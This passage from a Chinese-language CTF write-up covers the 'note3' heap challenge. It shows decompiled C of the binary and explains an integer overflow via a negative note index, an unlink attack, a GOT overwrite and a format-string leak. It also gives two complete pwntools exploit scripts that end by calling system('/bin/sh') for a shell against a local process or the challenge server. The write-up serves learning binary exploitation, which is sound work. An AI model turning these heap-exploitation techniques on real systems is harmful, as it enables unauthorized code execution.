class="keyword">return</span>;</span><br><span class="line">      case <span class="number">6</span>u:</span><br><span class="line">        exit(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      default:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提取出函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Input the length of the note content:(less than 1024)"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Input the note content:"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,Content)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Input the new content:"</span>)</span><br><span class="line">    sl(Content)</span><br></pre></td></tr></table></figure>

<p>这里只有这三种操作，其他的操作是没有用的，没有puts函数打印堆块里的东西，接着分析漏洞点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">malloc_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  __int64 <span class="built_in">size</span>; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span> &amp;&amp; ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">7</span> )<span class="comment">//最多7个块</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Note is full, add fail"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the length of the note content:(less than 1024)"</span>);</span><br><span class="line">  <span class="built_in">size</span> = sub_4009B9(<span class="string">"Input the length of the note content:(less than 1024)"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> &lt; <span class="number">0</span> )<span class="comment">//边界检查</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Length error"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">1024</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Content is too long"</span>);</span><br><span class="line">  v1 = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the note content:"</span>);</span><br><span class="line">  sub_4008DD(v1, <span class="built_in">size</span>, <span class="number">10</span>);</span><br><span class="line">  ptr[i] = v1;<span class="comment">//chunk0地址ptr=0x6020c8</span></span><br><span class="line">  qword_6020C0[i + <span class="number">8L</span>L] = <span class="built_in">size</span>;</span><br><span class="line">  qword_6020C0[<span class="number">0</span>] = ptr[i];<span class="comment">//0x6020C0可以看成是堆指针的缓冲区，每一次都会放进去，edit时也一样，chunk-1块(我们给个名hh）</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"note add success, the id is %d\n"</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这是我们的malloc函数，这里和note2一样有漏洞的是输入函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_4008DD</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a2 - <span class="number">1</span> &gt; i; ++i )这里和note2一样存在整数溢出的漏洞，a2<span class="number">-1</span>=<span class="number">-1</span>时，和<span class="keyword">unsigned</span>的i比较，就会被认为是无限大的数，相当于无限输入的堆溢出</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(a1 + i) = <span class="number">0</span>;<span class="comment">//这里会将发送的末尾最后一位置为0x00</span></span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想想应该是新的知识点，再仔细看看sub_4009B9函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009B9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_4008DD(&amp;nptr, <span class="number">32L</span>L, <span class="number">10</span>);</span><br><span class="line">  v1 = atol(&amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    v1 = -v1;  <span class="comment">//做过了整数溢出的题目，有经验了，0x8000000000000000就是-1，可以绕过检测,就可以得到chunk-1所在的堆指针</span></span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以是可以输入负数的，这里输入负数后得到的是我们的下标v1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the id of the note:"</span>);</span><br><span class="line">  v0 = sub_4009B9();<span class="comment">//出来可以是负数的下标</span></span><br><span class="line">  v3 = v0 - <span class="number">7</span> * ((((<span class="number">5270498306774157605L</span>L * v0) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">1</span>) - (v0 &gt;&gt; <span class="number">63</span>));</span><br><span class="line">  <span class="keyword">if</span> ( v0 - <span class="number">7</span> * ((((<span class="number">5270498306774157605L</span>L * v0) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">1</span>) - (v0 &gt;&gt; <span class="number">63</span>)) &gt;= v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = ptr[v3];</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Input the new content:"</span>);</span><br><span class="line">      sub_4008DD(ptr[v3], qword_6020C0[v3 + <span class="number">8</span>], <span class="number">10</span>);</span><br><span class="line">      qword_6020C0[<span class="number">0</span>] = ptr[v3];</span><br><span class="line">      LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">"Edit success"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">"please input correct id."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/blog_img/1563934791938.png" alt="1563934791938"></p>
<p>这里我们更改了下3号块的内容，使得0x6020C0指向3号块（前面有个指针赋值），  qword_6020C0[0] = ptr[i];</p>
<p><img src="/blog_img/1563934938814.png" alt="1563934938814"></p>
<p>edit谁，它就指向谁，那么我们再次输入负数时，会发现</p>
<p><img src="/blog_img/1563935981202.png" alt="1563935981202"></p>
<p>v3下标是-1，这里可以知道得到的rax就是v1，也就是0x6020C0处的chunk3地址，也就是我们可以实现对chunk3的操作，而且这时的0x6020C[0+8]=0x6020c8处的size为0，看调试信息：</p>
<p><img src="/blog_img/1563936710103.png" alt="1563936710103"></p>
<p>这里0x6020f8就是0x6020c0[7]的大小（这里是0），下面接着是下标为8，9，10，11,  12的堆块的大小看上图</p>
<p>那么也就是说sub_4008DD(chunk3，0,10)，这是一个read函数，size为0说明有溢出漏洞，直接chunk3无限下溢覆盖chunk4，接着再把chunk4给free掉，就能unlink了：</p>
<p><img src="/blog_img/1563937412294.png" alt="1563937412294"></p>
<p><img src="/blog_img/1563937463290.png" alt="1563937463290"></p>
<p>unlink实现，得到：</p>
<p><img src="/blog_img/1563937957643.png" alt="1563937957643"></p>
<p>这里chunk3—&gt;chunk0，接着就是常规操作了，但是这里需要注意一点就是，改free的got为printf_plt，然后打印出真实地址是不行的，很奇怪，这里介绍的是利用格式化字符串漏洞去打印栈上面的地址（涨姿势了），先学习一波，这里打印的话，是栈上偏移为11的位置，libc_start_main+240的真实地址，打出来就好办了，接着就可以直接一把getshell了，上exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#context(arch='i386', os='linux')</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./note3'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./note3'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Input the length of the note content:(less than 1024)"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Input the note content:"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,Content)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Input the new content:"</span>)</span><br><span class="line">    sl(Content)</span><br><span class="line"></span><br><span class="line">bk(<span class="number">0x400CD0</span>)</span><br><span class="line">intnum = <span class="number">-9223372036854775808</span></span><br><span class="line">ptr0 = <span class="number">0x6020E0</span></span><br><span class="line">FD = ptr0 - <span class="number">24</span></span><br><span class="line">BK = ptr0 - <span class="number">16</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>)</span><br><span class="line">py += p64(FD) + p64(BK)</span><br><span class="line">py = py.ljust(<span class="number">0x80</span>,<span class="string">'e'</span>)</span><br><span class="line">py += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'cccc'</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'eeee'</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'nnnn'</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(intnum,py)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">printf_plt = elf.symbols[<span class="string">'printf'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(free_got))</span><br><span class="line">edit(<span class="number">0</span>,p64(printf_plt) + p64(printf_plt))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x6020e8</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'%11$p'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">main_addr = int(rc(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"main_addr---&gt;"</span> + hex(main_addr)</span><br><span class="line">onegadget = main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>] + <span class="number">0xf1147</span></span><br><span class="line"><span class="comment">#system = main_addr - libc.symbols['__libc_start_main'] + libc.symbols["system"]</span></span><br><span class="line">edit(<span class="number">3</span>,p64(free_got))</span><br><span class="line">edit(<span class="number">0</span>,p64(onegadget)+p64(printf_plt))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里就是这样的做法，但是后来调试了才知道问题出在哪里;</p>
<p>这题因为要sl才能发送过去，所以会带上0x0a，又因为它会将发送的末尾置为0（发送0x9个字符），所以会改puts的真实地址：</p>
<p><img src="/blog_img/1563948811553.png" alt="1563948811553"></p>
<p>可以看到改成了popen，所以这里是不行的，但是我们可以发送7个字节丫，接上0x00刚好8个字节，就不会改了：</p>
<p><img src="/blog_img/1563949017842.png" alt="1563949017842"></p>
<p>这样就可以调用了~</p>
<p>然后就是一把梭：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#context(arch='i386', os='linux')</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./note3'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./note3'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Input the length of the note content:(less than 1024)"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Input the note content:"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,Content)</span>:</span></span><br><span class="line">    ru(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Input the id of the note:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Input the new content:"</span>)</span><br><span class="line">    sl(Content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bk(0x400CD0)</span></span><br><span class="line">intnum = <span class="number">-9223372036854775808</span></span><br><span class="line">ptr0 = <span class="number">0x6020E0</span></span><br><span class="line">FD = ptr0 - <span class="number">24</span></span><br><span class="line">BK = ptr0 - <span class="number">16</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>)</span><br><span class="line">py += p64(FD) + p64(BK)</span><br><span class="line">py = py.ljust(<span class="number">0x80</span>,<span class="string">'e'</span>)</span><br><span class="line">py += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'eeee'</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'dddd'</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'cccc'</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(intnum,py)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(free_got)+p64(atoi_got))</span><br><span class="line">edit(<span class="number">0</span>,p64(puts_plt)[<span class="number">0</span>:<span class="number">7</span>])</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">atoi_addr = u64(ru(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"atoi_addr---&gt;"</span> + hex(atoi_addr)</span><br><span class="line">onegadget = atoi_addr - libc.symbols[<span class="string">'atoi'</span>] + <span class="number">0xf02a4</span></span><br><span class="line">system = atoi_addr - libc.symbols[<span class="string">'atoi'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">malloc(<span class="number">0x80</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system)[<span class="number">0</span>:<span class="number">7</span>])</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span 